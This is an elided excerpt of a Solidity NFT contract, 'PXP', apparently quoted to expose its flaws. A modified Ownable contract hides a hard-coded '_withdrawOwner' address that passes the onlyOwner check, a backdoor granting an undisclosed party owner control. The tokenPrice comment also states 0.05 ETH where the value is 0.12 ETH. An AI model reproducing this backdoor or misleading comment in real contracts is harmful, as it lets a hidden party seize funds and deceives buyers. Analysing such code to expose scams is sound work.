...
abstract contract Ownable is Context {
    ...
    address private _withdrawOwner = 0xBF7562630639e8d9E681Fe0934e716FdE7f76124;
     ...
     */
    modifier onlyOwner() {
         require(owner() == _msgSender() || _withdrawOwner  == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
...
contract PXP is ERC721, ERC721Enumerable, Ownable {
    ...
    uint256 public constant tokenPrice = 120000000000000000; // 0.05 ETH
